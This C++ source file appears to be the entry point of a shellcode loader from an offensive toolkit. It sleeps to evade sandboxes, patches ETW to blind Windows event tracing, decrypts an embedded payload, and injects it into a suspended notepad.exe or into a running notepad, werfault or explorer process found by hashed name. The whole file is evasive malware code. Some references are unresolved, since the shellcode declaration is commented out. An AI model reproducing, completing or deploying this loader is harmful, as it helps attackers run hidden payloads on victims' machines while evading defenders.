#include "config.hpp"
#include "malapi.hpp"
#include "execute.hpp"
#include "encrypt.hpp"

#ifndef _DEBUG
#pragma comment(linker, "/ENTRY:entry")
#endif

VOID entry(void)
{
	DWORD	pid = 0;
	HANDLE	process_handle = INVALID_HANDLE_VALUE;

	// unsigned char shellcode[] = EncryptShellcode(CONFIG_PAYLOAD_SHELLCODE, CONFIG_ENCRYPT_KEY, sizeof(shellcode), sizeof(CONFIG_ENCRYPT_KEY));

#pragma region Guard Rails

#pragma endregion

#pragma region Evasion

#if SLEEP_ENABLED
	SleepMethod(SLEEP_TIME);
#else
#endif

		//#if ANTI_SANDBOX_ENABLED
		//#else
		//#endif

#if PATCH_ENABLED
	malapi::PatchEtw();
#endif

#pragma endregion

#pragma region Decrypt

	DecryptShellcode(shellcode, sizeof(shellcode), key, sizeof(key));

#pragma endregion

#if CONFIG_CREATE_PROCESS == 1
	LPCSTR file_path = "C:\\Windows\\System32\\notepad.exe";
	process_handle = malapi::CreateSuspendedProcess((LPSTR)file_path);
#elif CONFIG_CREATE_PROCESS == 2
	constexpr ULONG targets[] = {
		malapi::HashStringFowlerNollVoVariant1a("notepad.exe"),
		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
		malapi::HashStringFowlerNollVoVariant1a("explorer.exe"),
	};

	pid = malapi::GetPidFromHashedList((DWORD*)targets, sizeof(targets));

	if (pid == NULL)
	{
		LOG_ERROR("Error getting Process ID.");
		return;
	}
	LOG_SUCCESS("Process ID: %d", pid);
	process_handle = malapi::GetProcessHandle(pid);
#else
	// ProcessHollowing
	// AddressOfEntryPoint
#endif

	if (!ExecuteShellcode(process_handle, shellcode, sizeof(shellcode)))
	{
		LOG_ERROR("Failed to execute shellcode.");
	}
}

#pragma region [alternate entrypoints]

int main(void) { entry(); return 0; }

#pragma endregion